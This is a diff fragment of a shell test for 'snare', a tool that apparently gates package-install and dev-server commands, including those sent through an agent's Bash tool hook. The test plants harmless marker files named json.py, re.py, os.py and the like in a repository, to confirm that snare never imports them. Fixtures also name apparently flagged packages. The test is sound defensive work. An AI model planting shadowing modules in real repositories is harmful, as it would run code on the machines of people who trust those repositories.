+  # runs from inside the repo it checks, and `python -c` would import a
+  # planted json.py / re.py / gzip.py from there
+  mkdir -p "$D/plant"; local m
+  for m in json re gzip os hashlib shutil subprocess; do
+    printf 'open("%s/PLANTED-RAN","a").write("%s\\n")\n' "$D" "$m" > "$D/plant/$m.py"
+  done
+  printf 'litellm==1.107.0\n' > "$D/plant/requirements.txt"
+  printf '{"name":"p","scripts":{"dev":"next dev"}}\n' > "$D/plant/package.json"
+  ( cd "$D/plant" && git init -q && git add -A && git -c user.email=t@t -c user.name=t commit -qm i ) >/dev/null 2>&1
+  ( cd "$D/plant" && _gate_decide "npm run dev" "$D/plant" && _gate_decide "pip install -r requirements.txt" "$D/plant" \
+      && python3 -I -S -c "$(_deps_py)" scan "$INTEL_LIST" . --installed ) >/dev/null 2>&1
+  python3 -I -c 'import json,sys;print(json.dumps({"tool_name":"Bash","cwd":sys.argv[1],"tool_input":{"command":"npm run dev"}}))' "$D/plant" \
+    | ( cd "$D/plant" && SNARE_HOME="$SNARE_HOME" "$SNARE_ROOT/bin/snare" gate --hook ) >/dev/null 2>&1
+  if [ ! -e "$D/PLANTED-RAN" ]; then _st_ok "a json.py or re.py planted in a repository is never imported by snare's checks"
+  else _st_bad "a json.py or re.py planted in a repository is never imported by snare's checks ($(tr '\n' ' ' < "$D/PLANTED-RAN"))"; fi
 
   # a repository's lockfile, and a requirements file on the command line
   mkdir -p "$D/web"; printf '{"lockfileVersion":3,"packages":{"node_modules/ua-hijack":{"version":"0.7.29"}}}\n' > "$D/web/package-lock.json"
